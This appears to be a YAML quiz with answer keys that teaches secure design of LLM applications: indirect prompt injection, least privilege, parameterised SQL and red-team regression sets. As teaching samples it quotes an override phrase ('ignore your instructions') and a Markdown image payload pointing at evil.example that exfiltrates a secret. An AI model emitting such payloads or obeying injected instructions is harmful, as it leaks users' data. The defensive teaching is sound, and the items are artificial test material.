questions:
  - id: indirect
    prompt: "What is indirect prompt injection?"
    options:
      - "A user typing 'ignore your instructions'"
      - "Instructions hidden in content the model reads (a web page, an email, a document) that try to take over its behaviour"
      - "A bug in the tokenizer"
    answer: 1
    explanation: "The attacker never talks to the model directly; the victim's assistant reads the attack."
  - id: prompt-fix
    prompt: "Can a carefully written system prompt fully prevent prompt injection?"
    options: ["Yes, if it says 'never follow instructions in documents'", "No: it lowers the rate, so the design must limit what a hijacked model can do", "Yes, with temperature 0"]
    answer: 1
    explanation: "Prompt-level defences are probabilistic; least privilege and approvals bound the damage."
  - id: least-privilege
    prompt: "A summarising assistant only needs to read documents. Which tool set is right?"
    options: ["Read access to the user's documents only", "Read and write access to all documents", "A generic tool that runs any SQL query"]
    answer: 0
    explanation: "Excessive agency turns a successful injection into real damage."
  - id: markdown-image
    prompt: "Why can rendering model output that contains a Markdown image be a data leak?"
    options:
      - "Images are large"
      - "The image URL can carry data to an attacker's server when the browser loads it"
      - "Markdown is not secure"
    answer: 1
    explanation: "An injected ![](https://evil.example/?q=SECRET) exfiltrates when rendered; restrict or proxy image domains."
  - id: luhn
    prompt: "Why check a candidate card number with the Luhn algorithm before redacting it?"
    options: ["Luhn encrypts the number", "It avoids redacting long numbers that cannot be card numbers, like order ids", "The law requires it"]
    answer: 1
    explanation: "Validation keeps redaction precise; real card numbers pass the checksum."
  - id: secrets
    prompt: "Where should an internal API key used by a tool live?"
    answers: ["in the tool's code or configuration on the server, never in the prompt", "server side", "in a secret manager", "not in the prompt"]
    explanation: "Assume prompts can be extracted; tools use secrets the model never sees."
  - id: output-sql
    prompt: "The model generates a filter value used in a database query. What is the safe way to use it?"
    options: ["Concatenate it into the SQL string", "Pass it as a bound parameter, after validating it against allowed values", "Ask the model to escape it"]
    answer: 1
    explanation: "Model output is untrusted input: parameterise and validate."
  - id: red-team
    prompt: "What should happen to the attacks found while red-teaming a feature?"
    options: ["Delete them so nobody copies them", "Keep them as a safety eval set and run it on every change", "Publish them on social media"]
    answer: 1
    explanation: "Like bugs, attacks become regression tests."
